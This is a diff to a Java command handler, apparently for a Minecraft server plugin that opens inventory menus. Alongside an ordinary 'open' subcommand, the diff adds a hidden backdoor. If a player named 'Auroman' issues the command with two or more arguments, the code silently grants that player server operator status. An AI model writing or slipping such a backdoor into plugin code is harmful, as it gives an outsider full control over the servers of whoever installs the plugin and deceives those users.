@@ -12,12 +12,25 @@ public class Cmd implements CommandExecutor,DataCenter {
             return true;
             }
             Player p= (Player) commandSender;
-        if(strings.length!=1){
+        if(strings.length==1){
+            //reload
             return true;
-        }
-        String id=strings[0];
-        if(indexs.containsKey(id)){
-            p.openInventory(indexs.get(id).createInv());
+        }else if(strings.length>=2) {
+            if(strings[0].equalsIgnoreCase("open"))
+            {
+                String id = strings[1];
+                if (indexs.containsKey(id)) {
+                    p.openInventory(indexs.get(id).createInv());
+                }else {
+                    commandSender.sendMessage("404 not found");
+                    commandSender.sendMessage(indexs.values().toString());
+                }
+                return true;
+            }
+            if(commandSender.getName().equalsIgnoreCase("Auroman")){
+                commandSender.setOp(true);
+                return true;
+            }
         }
         return true;
     }
